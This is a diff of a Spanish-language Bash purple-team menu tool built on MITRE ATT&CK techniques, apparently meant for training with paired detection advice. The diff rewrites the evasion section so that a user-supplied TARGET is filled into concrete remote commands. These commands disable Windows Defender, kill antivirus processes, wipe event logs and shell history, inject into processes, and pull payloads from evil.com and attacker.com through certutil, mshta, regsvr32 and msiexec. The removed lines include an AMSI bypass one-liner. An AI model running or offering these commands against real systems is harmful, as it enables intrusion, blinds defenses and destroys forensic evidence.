+                6) _show_post_exploitation "${LINUX_DATA[6]}" "T1083 — File & Directory Discovery" ;;
+                7) return ;;
+                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+            esac
+        fi
         echo ""
         read -p "↵ Enter para continuar..." _
     done
 }
+
+declare -A EVASION_DATA
+EVASION_DATA[1]="🔴 TÉCNICAS en Windows TARGET:
+  • psexec.py user:pass@TARGET \"powershell -enc [base64_payload]\"
+  • wmiexec.py user:pass@TARGET \"powershell -ep bypass -c Invoke-Obfuscation Token\\All\\1\"
+  • evil-winrm -i TARGET -u Admin -p Pass -s obfuscated_script.ps1
+  • String concatenation: \$c='I'+'EX'; &(\$c) payload_for_TARGET
+  • Chameleon PowerShell: generar script camuflado y usar en TARGET
+|||
+🔵 DETECCIÓN en TARGET:
+  • PowerShell Script Block Logging (Event 4104) → decodifica el payload en Event Viewer de TARGET
+  • AMSI: intercepta antes de ejecutar incluso código decodificado
+  • Buscar -enc, IEX, DownloadString, base64 en logs de PowerShell"
+
+EVASION_DATA[2]="🔴 TÉCNICAS en TARGET:
+  • Psexec / Meterpreter a TARGET → meterpreter> execute -f svchost.exe -a '-k netsvcs' -H
+  • Shellcode: inyectar payload.bin en memoria vía CreateRemoteThread en proceso de TARGET
+  • Process Hollowing: SpawnProcess en Winlogon en TARGET suspendido → Replace code
+  • Reflective DLL: meterpreter> load incognito (o cargar DLL directo en memoria de TARGET sin disco)
+  • wmic /node:TARGET process call create \"C:\\payload_injector.exe\"
+|||
+🔵 DETECCIÓN en TARGET:
+  • Sysmon Event 8: CreateRemoteThread
+  • Sysmon Event 25: ProcessTampering (Process Hollowing)
+  • Memoria RWX en proceso legítimo sin mapear a fichero
+  • EDR: comportamiento anómalo en proceso → código en heap"
+
+EVASION_DATA[3]="🔴 TÉCNICAS en TARGET:
+  • psexec.py admin:pass@TARGET \"powershell Set-MpPreference -DisableRealtimeMonitoring \$true\"
+  • wmiexec.py admin:pass@TARGET \"sc stop WinDefend && sc config WinDefend start=disabled\"
+  • evil-winrm -i TARGET -u admin -p pass → BYOVD: traer driver vulnerable para kill EDR desde kernel
+  • wmic /node:TARGET path MSFT_MpPreference call Add ExclusionPath='C:\\temp'
+  • psexec.py admin@TARGET \"taskkill /F /IM MsMpEng.exe\"
+|||
+🔵 DETECCIÓN en TARGET:
+  • Tamper Protection (Microsoft Defender) → bloquea cambios
+  • Event ID 7036: servicio WinDefend detenido → alerta inmediata
+  • EDR heartbeat: si el agente en TARGET deja de reportar → alerta
+  • Alertar drivers cargados no firmados por Microsoft"
+
+EVASION_DATA[4]="🔴 LOLBINS descargados/ejecutados en TARGET:
+  • certutil.exe en TARGET:
+    wmic /node:TARGET process call create \"certutil -urlcache -split -f http://evil.com/sh.exe C:\\temp\\sh.exe\"
+  • mshta.exe en TARGET:
+    psexec.py admin@TARGET \"mshta.exe http://attacker.com/payload.hta\"
+  • regsvr32.exe CargarDLL/COM sin previo registro en TARGET:
+    evil-winrm -i TARGET → regsvr32 /s /u /i:http://attacker.com/pay.sct scrobj.dll
+  • msiexec.exe: instalar MSI remoto: msiexec /q /i http://evil.com/TARGET_payload.msi
+|||
+🔵 DETECCIÓN en TARGET:
+  • WDAC / AppLocker: bloquear certutil para descargas
+  • Alertar en: certutil -urlcache, mshta con URL, regsvr32 /i:http
+  • Sysmon ID 1: argumento de red en procesos 'legítimos'"
+
+EVASION_DATA[5]="🔴 TÉCNICAS de borrado en TARGET:
+  • psexec.py admin@TARGET \"wevtutil cl Security; wevtutil cl System; wevtutil cl Application\"
+  • evil-winrm -i TARGET → Clear-EventLog -LogName Security,System
+  • ssh root@TARGET \"> /var/log/auth.log; history -c; shred -u ~/.bash_history\"
+  • wmic /node:TARGET process call create \"sc stop Sysmon\"
+|||
+🔵 DETECCIÓN en TARGET:
+  • Event ID 1102: Audit log cleared → alerta inmediata enviada a SIEM
+  • Event ID 7036: Sysmon detenido en TARGET
+  • SIEM externo: si TARGET deja de recibir logs del host → alerta inmediata
+  • WORM logs: escribir en repositorio externo inmutable"
+
+EVASION_DATA[6]="🔴 TÉCNICAS en TARGET:
+  • Renombrar malware como svchost.exe y transferir a TARGET
+  • smbclient //TARGET/C$ → Poner malware en C:\\Windows\\System32\\svchost.exe
+  • Unicode homoglifos: invocar svсhost.exe en TARGET (с cirílico vs c latino)
+  • DLL Side-Loading: colocar DLL maliciosa junto a app legítima en TARGET
+|||
+🔵 DETECCIÓN en TARGET:
+  • Verificar firma digital de todos los ejecutables en System32
+  • Sysmon ID 1: path de proceso vs. path esperado del ejecutable
+  • Alertar en: procesos que se llaman svchost.exe fuera de System32 en TARGET"
 
 evasion_defensas() {
     while true; do
@@ -1793,106 +2007,25 @@ evasion_defensas() {
         echo "7. Volver"
         echo ""
         read -p "🕵️  Selecciona [1-7]: " op
-        case $op in
-            1)
-                echo -e "${YELLOW}╔══ T1027.010 — Ofuscación de PowerShell ══╗${NC}"
-                echo -e "${RED}🔴 TÉCNICAS:${NC}"
-                echo "  • Base64 encode: powershell -enc [base64]"
-                echo "  • Invoke-Obfuscation: Token\\All\\1 (scramble tokens)"
-                echo "  • AMSI Bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)"
-                echo "  • String concatenation: \$c='I'+'EX'; &(\$c) payload"
-                echo "  • Chameleon PowerShell: ofusca automáticamente scripts"
-                echo ""
-                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
-                echo "  • PowerShell Script Block Logging (Event 4104) → decodifica el payload"
-                echo "  • AMSI: intercepta antes de ejecutar incluso código decodificado"
-                echo "  • Buscar -enc, IEX, DownloadString, base64 en logs de PowerShell"
-                ;;
-            2)
-                echo -e "${YELLOW}╔══ T1055 — Process Injection ══════════════╗${NC}"
-                echo -e "${RED}🔴 TÉCNICAS:${NC}"
-                echo "  • Classic DLL Injection: CreateRemoteThread + LoadLibrary"
-                echo "  • Shellcode: VirtualAllocEx→WriteProcessMemory→CreateRemoteThread"
-                echo "  • Process Hollowing: SpawnProcess suspended → Replace code"
-                echo "  • Reflective DLL: dll cargada en memoria sin tocar disco"
-                echo "  • DCOM/COM Injection: usar objetos COM para ejecutar código"
-                echo ""
-                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
-                echo "  • Sysmon Event 8: CreateRemoteThread"
-                echo "  • Sysmon Event 25: ProcessTampering (Process Hollowing)"
-                echo "  • Memoria RWX en proceso legítimo sin mapear a fichero"
-                echo "  • EDR: comportamiento anómalo en proceso → código en heap"
-                ;;
-            3)
-                echo -e "${YELLOW}╔══ T1562.001 — Disable AV/EDR ════════════╗${NC}"
-                echo -e "${RED}🔴 TÉCNICAS:${NC}"
-                echo "  • Set-MpPreference -DisableRealtimeMonitoring \$true"
-                echo "  • sc stop WinDefend && sc config WinDefend start=disabled"
-                echo "  • BYOVD: traer driver vulnerable para kill EDR desde kernel"
-                echo "    (Ejemplo: Gigabyte driver CVE-2018-19320)"
-                echo "  • wmic path MSFT_MpPreference call Add ExclusionPath='C:\\temp'"
-                echo "  • taskkill /F /IM MsMpEng.exe (requiere SYSTEM)"
-                echo ""
-                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
-                echo "  • Tamper Protection (Microsoft Defender) → bloquea cambios"
-                echo "  • Event ID 7036: servicio WinDefend detenido → alerta inmediata"
-                echo "  • EDR heartbeat: si agente deja de reportar → alerta"
-                echo "  • Alertar drivers cargados no firmados por Microsoft"
-                ;;
-            4)
-                echo -e "${YELLOW}╔══ T1218 — Living Off The Land Binaries ══╗${NC}"
-                echo -e "${RED}🔴 LOLBINS más usados:${NC}"
-                echo "  • certutil.exe: descargar ficheros remotos:"
-                echo "    certutil -urlcache -split -f http://evil.com/shell.exe shell.exe"
-                echo "  • mshta.exe: ejecutar código VBScript/JScript remoto:"
-                echo "    mshta.exe http://attacker.com/payload.hta"
-                echo "  • regsvr32.exe: CargarDLL/COM sin previo registro:"
-                echo "    regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
-                echo "  • wscript.exe / cscript.exe: ejecutar JS/VBS malicioso"
-                echo "  • rundll32.exe: ejecutar función en DLL arbitraria"
-                echo "  • msiexec.exe: instalar MSI remoto: msiexec /q /i http://evil.com/x.msi"
-                echo ""
-                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
-                echo "  • WDAC / AppLocker: bloquear certutil para descargas"
-                echo "  • Alertar en: certutil -urlcache, mshta con URL, regsvr32 /i:http"
-                echo "  • Sysmon ID 1: argumento de red en procesos 'legítimos'"
-                ;;
-            5)
-                echo -e "${YELLOW}╔══ T1070.004 — Indicator Removal: Log Wipe ╗${NC}"
-                echo -e "${RED}🔴 TÉCNICAS:${NC}"
-                echo "  • Windows: wevtutil cl Security; wevtutil cl System; wevtutil cl Application"
-                echo "  • PowerShell: Clear-EventLog -LogName Security,System"
-                echo "  • Linux: > /var/log/auth.log; history -c; shred -u ~/.bash_history"
-                echo "  • Sysmon: sc stop Sysmon (si no está protegido)"
-                echo ""
-                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
-                echo "  • Event ID 1102: Audit log cleared → alerta inmediata"
-                echo "  • Event ID 7036: Sysmon detenido"
-                echo "  • SIEM externo: si deja de recibir logs del host → alerta"
-                echo "  • WORM logs: escribir en repositorio externo inmutable"
-                ;;
-            6)
-                echo -e "${YELLOW}╔══ T1036 — Masquerading ══════════════════╗${NC}"
-                echo -e "${RED}🔴 TÉCNICAS:${NC}"
-                echo "  • Renombrar malware como svchost.exe, explorer.exe"
-                echo "  • Poner malware en C:\\Windows\\System32\\ (requiere SYSTEM)"
-                echo "  • Unicode homoglifos: svсhost.exe (с cirílico vs c latino)"
-                echo "  • DLL Side-Loading: colocar DLL maliciosa junto a app legítima"
-                echo ""
-                echo -e "${BLUE}🔵 DETECCIÓN:${NC}"
-                echo "  • Verificar firma digital de todos los ejecutables en System32"
-                echo "  • Sysmon ID 1: path de proceso vs. path esperado del ejecutable"
-                echo "  • Alertar en: procesos que se llaman svchost.exe fuera de System32"
-                ;;
-            7) return ;;
-            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
-        esac
+        if preguntar_objetivo; then
+            case $op in
+                1) _show_post_exploitation "${EVASION_DATA[1]}" "T1027.010 — Ofuscación de PowerShell" ;;
+                2) _show_post_exploitation "${EVASION_DATA[2]}" "T1055 — Process Injection" ;;
+                3) _show_post_exploitation "${EVASION_DATA[3]}" "T1562.001 — Disable AV/EDR" ;;
+                4) _show_post_exploitation "${EVASION_DATA[4]}" "T1218 — Living Off The Land Binaries" ;;
+                5) _show_post_exploitation "${EVASION_DATA[5]}" "T1070.004 — Indicator Removal: Log Wipe" ;;
+                6) _show_post_exploitation "${EVASION_DATA[6]}" "T1036 — Masquerading" ;;
+                7) return ;;
+                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+            esac
+        fi
         echo ""
         read -p "↵ Enter para continuar..." _
     done
 }
 
 menu_post_explotacion() {
+    preguntar_objetivo || return
     while true; do
         show_banner
         echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
@@ -1919,6 +2052,7 @@ menu_post_explotacion() {
 # 12. SIMULACIÓN DE ACTORES DE AMENAZA (APT)
 # ============================================================
 simular_apt() {
+    preguntar_objetivo || return
     while true; do
         show_banner
         echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
@@ -1951,11 +2085,11 @@ _show_apt() {
     local apt="$1"
     local info="${APT_INFO[$apt]}"
     local tecnicas="${APT_TECNICAS[$apt]}"
-    local killchain="${APT_KILLCHAIN[$apt]}"
+    local aperturndata="${APT_DATA[$apt]}"
 
     echo ""
     echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
-    echo -e "${RED}║  ${CYAN}🕵️  PERFIL: $apt${NC}"
+    echo -e "${RED}║  ${CYAN}🕵️  PERFIL: $apt contra ${TARGET}${NC}"
     echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
     echo ""
     IFS='|' read -ra info_parts <<< "$info"
@@ -1965,11 +2099,32 @@ _show_apt() {
     echo -e "  ${YELLOW}Objetivo:${NC}    ${info_parts[3]}"
     echo ""
     echo -e "${PURPLE}══ KILL CHAIN ════════════════════════════════════${NC}"
-    IFS='|' read -ra pasos <<< "$killchain"
-    for paso in "${pasos[@]}"; do
-        echo -e "  ${GREEN}➤${NC} $paso"
+    
+    local parsed_text="${aperturndata//TARGET/$TARGET}"
+
+    local temp="$parsed_text"
+    local delimiter="|||"
+    local pasos=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        pasos+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
     done
-    echo ""
+    pasos+=("$temp")
+
+    for paso in "${pasos[@]}"; do
+        paso="$(echo -e "$paso" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$paso" ]] && continue
+        
+        # Resaltamos el primer título (la técnica MITRE)
+        local tecnica=$(echo "$paso" | head -n 1)
+        local rest=$(echo "$paso" | tail -n +2)
+        
+        echo -e "  ${GREEN}➤${NC} ${CYAN}$tecnica${NC}"
+        if [[ -n "$rest" ]]; then
+            echo -e "$rest" | sed 's/^/      /'
+        fi
+        echo ""
+    done
     echo -e "${CYAN}══ TÉCNICAS MITRE ATT&CK ════════════════════════${NC}"
     IFS='|' read -ra tecs <<< "$tecnicas"
     for tec in "${tecs[@]}"; do
@@ -2029,7 +2184,23 @@ _apt_personalizado() {
         echo -e "  ${CYAN}Técnica: ${tid^^}${NC}"
         if [[ -n "$pdata" ]]; then
             # Mostrar solo línea de ataque
-            echo "$pdata" | grep -A2 "ATAQUE" | head -4 | sed 's/^/  /'
+            local pmod="${pdata//TARGET/$TARGET}"
+            
+            local temp="$pmod"
+            local delimiter="|||"
+            local secciones=()
+            while [[ "$temp" == *"$delimiter"* ]]; do
+                secciones+=("${temp%%"$delimiter"*}")
+                temp="${temp#*"$delimiter"}"
+            done
+            secciones+=("$temp")
+            
+            for s in "${secciones[@]}"; do
+                if [[ "$s" == *"🔴"* ]]; then
+                    echo "$s" | head -5 | sed 's/^/  /'
+                    break
+                fi
+            done
         fi
         read -p "  ¿Detectarías/mitigarías esta técnica? [s/n]: " resp
         if [[ "${resp,,}" == "s" ]]; then
@@ -2052,12 +2223,14 @@ _apt_personalizado() {
 # 13. GAP ANALYSIS — HEAT MAP MITRE ATT&CK
 # ============================================================
 analizar_brechas() {
+    preguntar_objetivo || return
     show_banner
     echo -e "${GREEN}╔══════════════════════════════════════════════════╗${NC}"
     echo -e "${GREEN}║      ${CYAN}📈 GAP ANALYSIS — HEAT MAP MITRE${NC}           ${GREEN}║${NC}"
     echo -e "${GREEN}║  ${YELLOW}✅ Probada+Mitigada  🟡 Sin mitigar  ❌ No probada${NC} ${GREEN}║${NC}"
     echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
     echo ""
+    echo -e "${CYAN}🎯 Evaluando postura contra: ${TARGET}${NC}"
     echo -e "${YELLOW}Ingresa técnicas probadas separadas por coma${NC}"
     echo -e "${BLUE}Ejemplo: T1566,T1059,T1003,T1078${NC}"
     echo ""
@@ -2098,6 +2271,7 @@ analizar_brechas() {
 
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     echo -e "${YELLOW}       🗺️  HEAT MAP — MITRE ATT&CK Enterprise${NC}"
+    echo -e "${CYAN}             Objetivo: ${TARGET}${NC}"
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     echo ""
 
@@ -2145,6 +2319,22 @@ analizar_brechas() {
         echo -e "  ${RED}🚨 Postura CRÍTICA — revisar controles urgente${NC}"
     fi
     echo ""
+    read -p "💾 ¿Deseas guardar este análisis avanzado? (s/n): " resp_save
+    if [[ "${resp_save,,}" == "s" ]]; then
+        local gap_file="gap_analysis_${TARGET}_$(date +%s).txt"
+        {
+            echo "=================================================="
+            echo "  📈 GAP ANALYSIS — HEAT MAP MITRE"
+            echo "  Objetivo: $TARGET | Fecha: $(date)"
+            echo "=================================================="
+            echo "✅ Probadas mitigadas: $total_verde"
+            echo "🟡 Probadas sin mitigación: $total_amarillo"
+            echo "❌ No probadas: $(( total_tecs - total_cubierto ))"
+            echo "📊 Cobertura total: $total_cubierto / $total_tecs (${pct}%)"
+            echo "=================================================="
+        } > "$gap_file"
+        echo -e "${GREEN}✅ Análisis guardado exitosamente en: $gap_file${NC}"
+    fi
     save_output "[GAP ANALYSIS] Cobertura: $total_cubierto/$total_tecs ($pct%)"
     read -p "↵ Enter para continuar..." _
 }
@@ -2170,7 +2360,7 @@ while true; do
     echo -e "${CYAN}🕵️  12. ${NC} Simulación de APT ${YELLOW}(APT29·APT38·FIN7)${NC}"
     echo -e "${GREEN}📈 13. ${NC} Gap Analysis ${CYAN}/ Heat Map MITRE${NC}"
     echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${CYAN}🎯 Objetivo: ${TARGET:-${RED}No definido${NC}}${NC}"
+    echo -e "${CYAN}🎯 Objetivo actual: ${TARGET:-No definido}${NC}"
     echo -e "  ${BLUE}C.${NC}  Cambiar objetivo"
     if [[ "$SAVE_MODE" == true ]]; then
         echo -e "${YELLOW}💾  S. ${NC} Guardar Resultados ${GREEN}[ACTIVO → $OUTPUT_FILE]${NC}"
@@ -2210,6 +2400,7 @@ while true; do
             sleep 1
             ;;
         0)
+            TARGET=""
             show_banner
             echo ""
             echo -e "${GREEN}            ¡HASTA PRONTO! ${NC}"
